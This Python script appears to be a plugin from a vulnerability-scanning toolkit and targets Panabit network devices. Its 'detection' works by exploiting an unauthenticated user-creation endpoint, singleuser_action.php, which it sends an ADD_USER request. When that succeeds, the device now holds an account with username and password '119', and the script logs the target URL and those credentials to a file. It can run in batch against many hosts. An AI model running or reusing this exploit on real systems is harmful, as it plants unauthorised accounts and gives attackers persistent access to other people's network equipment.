#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import json

import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class PanabitUserAddScan:
    def run(self, urls):
        url = urls + '/singleuser_action.php'
        # print(head)
        data = { "syncInfo": { "user": { "userId": "119", "userName": "119", "employeeId": "119", "departmentId": "119", "departmentName": "119", "coporationId": "119", "corporationName": "119", "userSex": "1",  "userDuty": "119", "userBirthday": "119", "userPost": "119", "userPostCode": "119", "userAlias": "119", "userRank": "119", "userPhone": "119", "userHomeAddress": "119", "userMobilePhone": "119", "userMailAddress": "119", "userMSN": "119", "userNt": "119", "userCA": "119", "userPwd": "119", "userClass": "119", "parentId": "119", "bxlx": "119" },"operationType": "ADD_USER" } }
        try:
            response = requests.post(url, headers=self.headers, json=data,verify=self.ssl, timeout=5, proxies=self.proxy)
            res_json = json.loads(response.text)
            # print(res_json['yn'])
            if res_json['yn'] == "yes":
                if not self.batch:
                    OutPrintInfoSuc("Panabit", f'Panabit用户添加执行完成 Url: {urls}')
                    OutPrintInfo("Panabit", "[b bright_red]User: 119 | PASS: 119")
                else:
                    OutPrintInfoSuc("Panabit", f'Panabit用户添加执行完成 Url: {urls}')
                    with open("./result/panabit_user_add.txt","a") as w:
                        w.write(f"{urls}------User: 119 | PASS: 119\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Panabit", '不存在漏洞')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Panabit", '不存在漏洞')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Panabit", '开始执行Panabit漏洞检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Panabit", 'Panabit漏洞检测执行结束')